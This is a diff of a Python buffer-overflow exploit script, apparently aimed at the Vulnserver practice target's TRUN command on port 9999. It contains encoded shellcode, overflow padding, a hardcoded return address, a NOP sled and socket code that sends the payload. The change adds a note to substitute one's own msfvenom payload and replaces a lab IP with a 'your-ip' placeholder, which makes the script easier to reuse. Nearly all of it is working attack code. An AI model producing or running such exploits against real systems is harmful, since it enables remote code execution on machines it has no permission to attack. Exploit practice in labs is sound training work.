@@ -2,6 +2,7 @@ import socket
 import sys
 #625011af
 
+#use your own msfvenom payload
 overflowPayload = ("\xd9\xc2\xd9\x74\x24\xf4\x58\xbb\x06\x45\xe4\x39\x31\xc9\xb1"
 "\x52\x31\x58\x17\x03\x58\x17\x83\xc6\x41\x06\xcc\x3a\xa1\x44"
 "\x2f\xc2\x32\x29\xb9\x27\x03\x69\xdd\x2c\x34\x59\x95\x60\xb9"
@@ -30,7 +31,7 @@ overflowPayload = ("\xd9\xc2\xd9\x74\x24\xf4\x58\xbb\x06\x45\xe4\x39\x31\xc9\xb1
 stringToSend = "TRUN /.:/" + "A" * 2009 + "\xaf\x11\x50\x62" + "\x90 " * 32 + overflowPayload  # it may not work if we don't write x90 and 32 bit
 try:
     Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    Socket.connect(("192.168.56.1", 9999))  # must be 9999 port
+    Socket.connect(("your-ip", 9999))  # must be 9999 port
     byte = stringToSend.encode("latin1")  # latin1 because sending byte
     Socket.send(byte)
     Socket.close()
